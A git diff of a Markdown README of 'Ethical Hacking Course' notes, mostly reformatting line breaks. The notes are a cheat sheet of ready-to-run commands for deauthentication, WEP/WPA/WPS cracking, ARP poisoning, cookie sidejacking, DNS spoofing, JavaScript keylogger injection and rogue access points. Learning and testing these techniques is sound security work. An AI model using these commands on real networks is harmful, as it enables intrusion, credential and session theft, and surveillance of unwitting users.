@@ -1,4 +1,5 @@
 # Ethical Hacking Course
+
 Here are the commands that will be used in the course
 
 [Fluxion](https://github.com/FluxionNetwork/fluxion)
@@ -6,31 +7,15 @@ Here are the commands that will be used in the course
 [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
 
 `apt-get install firmware-atheros`
+
 # Network
-A network is a group of devices that can 
-communicate with each other. Generally 
-these devices are computer, celphones and 
-printers. They can transfer data between 
-them and access the internet through the 
-router. The router, or access point (AP) 
-is the only device on the network that 
-can access the web, and it is the only 
-one visible outside of the network. To 
-communicate with the devices the 
-information is sent as packets. In the 
-network, devices ensure that the packet 
-is been sent to the right destination by 
-adding the source and the destination 
-MAC.
+
+A network is a group of devices that can communicate with each other. Generally, these devices are computers, cellphones, and printers. They can transfer data between them and access the internet through the router. The router or access point (AP) is the only device on the network that can access the web, and it is the only one visible outside of the network. To communicate with the devices the information is sent as packets. In the network, devices ensure that the packet is been sent to the right destination by adding the source and the destination MAC.
+
 ## MAC Address
-MAC Address stands for Media Access 
-Control and is an unique and permanent 
-number assigned by the manufacturer for each 
-network interface. It specifies 
-the brand and the model of the device. 
-Because it is a unique number it can be 
-traced. To to be anonymous it is a good 
-idea to change the MAC.
+
+MAC Address stands for Media Access Control and is a unique and permanent number assigned by the manufacturer for each
+network interface. It specifies the brand and the model of the device. Because it is a unique number it can be traced. To to be anonymous it is a good idea to change the MAC.
 
 * Get the interface down
   * `ifconfig wlan0 down`
@@ -39,26 +24,29 @@ idea to change the MAC.
   * `ifconfig wlan0 hw ether 00:11:22:33:44:55`
 * Get the interface up
   * `ifconfig wlan0 up`
+  
 ## Wireless Card Mode
-By deafult each device on the network 
-only recieves packets that has its MAC as 
-the destination MAC. This is the Managed 
-mode. But you can see and capture all 
-packets that are been sent by changing 
-this mode to Monitor.
+
+By default, each device on the network only receives packets that have its MAC as the destination MAC. This is the Managed mode. But you can see and capture all packets that are been sent by changing this mode to Monitor.
+
 ### Method 1
+
 * Start Monitor Mode
   * `airmon-ng start wlan0`
 * Stop Monitor Mode
   * `airmon-ng stop wlan0mon`
+
 ### Method 2
+
 * Get the interface down
   * `ifconfig wlan0 down`
 * Change Mode
   * `iwconfig wlan0 mode monitor`
 * Get the interface up
   * `ifconfig wlan0 up`
+
 ### Method 3
+
 * Get the interface down
   * `ifconfig wlan0 down`
 * Kill Process
@@ -69,16 +57,14 @@ this mode to Monitor.
   * `ifconfig wlan0 up`
 * Restart Network Manager
   * `service NetworkManager restart`
+
 ## Packet Sniffing
+
 [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
 
-After changing the mode of the wireless 
-adapter to Monitor, you are able to 
-capture all packets sent arround you.
+After changing the mode of the wireless adapter to Monitor, you are able to capture all packets sent around you.
 
-Now you can see all the APs and clients 
-arround you, their channel and MAC 
-addresses.
+Now you can see all the APs and clients around you, their channel and MAC addresses.
 
 * Start Sniffing
   * `airodump-ng wlan0mon`
@@ -86,33 +72,29 @@ addresses.
   * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
 * Deauth Attacks
   * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
+
 ## Crack WEP
-WEP stands for Wired Equivalent Privacy 
-and is an old encryption method that 
-uses RC4 algorithm to encrypt the 
-packets. In this encryption method the 
-packet is encrypted with the key by the 
-sender, and the reciver decrypts it. Each 
-packet sent has a unique keystream. 
-Random initialization vector (IV) added 
-to the WEP key is used to create this 
-keystream. Then this keystream is used to 
-encrypt the packet. This IV is sent in 
-plain text with the packet for the 
-receiver to decrypt it, and it is only 
-24-bits long.
+
+WEP stands for Wired Equivalent Privacy and is an old encryption method that uses the RC4 algorithm to encrypt the packets. In this encryption method, the packet is encrypted with the key by the sender, and the receiver decrypts it. Each packet sent has a unique keystream. A random initialization vector (IV) is added to the WEP key is used to create this keystream. Then this keystream is used to encrypt the packet. This IV is sent in plain text with the packet for the receiver to decrypt it, and it is only 24-bits long.
+
 ### Busy Network
+
 * Start airodump-ng in the target network
 * Crack
   * `aircrack-ng <network-file>`
+
 ### NOT Busy Network
+
 * Associate with the target network (tell the network that I wnat to connect to it)
 * Fake Auth (Associate)
   * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
 * Packet Injection
   * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
+
 ## Crack WPA/WPA2
+
 ### With WPS
+
 * If wash is not working
   * `mkdir /etc/reaver`
 * Check if the network has WPS
@@ -121,38 +103,56 @@ receiver to decrypt it, and it is only
 * Attack
   * `reaver -b <network bssid> -c <network channel> -i wlan0mon -vvv --no-associate`
 * If you get an error get an [older version of reaver](https://files.fm/u/z5ha7t93)
+
 ### Without WPS
+
 * Start airodump-ng in the target
 * Deauth a client to capture the WPA Hanshake
 * Crack the Key
   * `aircrack-ng <handshake-file> -w <word-list>`
+
 ### Create a Wordlist
+
 `crunch <min-length> <max-length> <characters> -o <file-name> -t <pattern>`
+
 ## Information Gathering
+
 After authenticating to a network you gather information about it.
+
 ### Using Netdiscover
+
 * `netdiscover -r <network internal IP>.1/24 -i wlan0`
+
 ### Using Autoscan
+
 * download [Autoscan](http://autoscan-network.com/download)
 * add 32bit compatibility `dpkg --add-architecture i386`
 * update `apt-get update`
 * download and install library `apt-get install libc6:i386`
 * install Autoscan in the terminal running `./<downaloaded file>`
 * run Autoscan
+
 ### Using Nmap (Zenmap)
+
 * run `zenmap`
 * in Target put `<network internal IP>.1/24`
 * play arround with Profile
+
 ## Man In The Middle (MITM) Atacks
+
 These atacks only work with HTTP sites without HSTS
+
 ### ARP Poisoning Using arpspoof
+
 * Tell the target client that I am the router
   * `arpsoof -i wlan0 -t <target client IP> <router IP>`
 * Tell the router that I am the target client
   * `arpsoof -i wlan0 -t <router IP> <target client IP>`
 * Enable IP forward to allow packets to flow trough my device without being dropped
   * `echo 1 > /proc/sys/net/ipv4/ip_forward`
+
 ### ARP Poisoning Using MITMf
+
 * Tell the target client that I am router
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`
 
@@ -161,7 +161,9 @@ This way you can see all the post request made by the target client.
 To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.
 
 ### Session Hijacking
+
 If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.
+
 * Install Ferret
   * `apt-get install ferret-sidejack`
 * Become the MITM
@@ -169,7 +171,9 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `ferret -i wlan0`
 * Web GUI to see the cookies and inject them into my browser
   * `hamster`
+
 ### DNS Spoofing
+
 * Start Apache Server
   * `service apache2 start`
   * The content of the page is in `/var/www/html`
@@ -178,15 +182,21 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * Edit the `A` record, that is responsible for translate names to IP adresses
 * Become the MITM
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
+
 ### Capture Screen & Injecting Keylogger
+
 * Capture Screen
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --screen`
 * Injecting Keylogger
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --jskeylogger`
+
 ### Code Injection
+
 * Inject JS
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
+  
 ### Fake Access Point (Honeypot) to become the MITM
+
 * You need to have internet connection and a wireless card to broadcast it.
   * `apt install mana-toolkit`
 * Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
@@ -194,7 +204,9 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 * Start the network
   * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
+
 ### Wireshark
+
 Use Wireshark to sniff the traffic of a network card. If tou are the MITM you can sniff the trafic of the target computet too.
 
 # Gaining Access
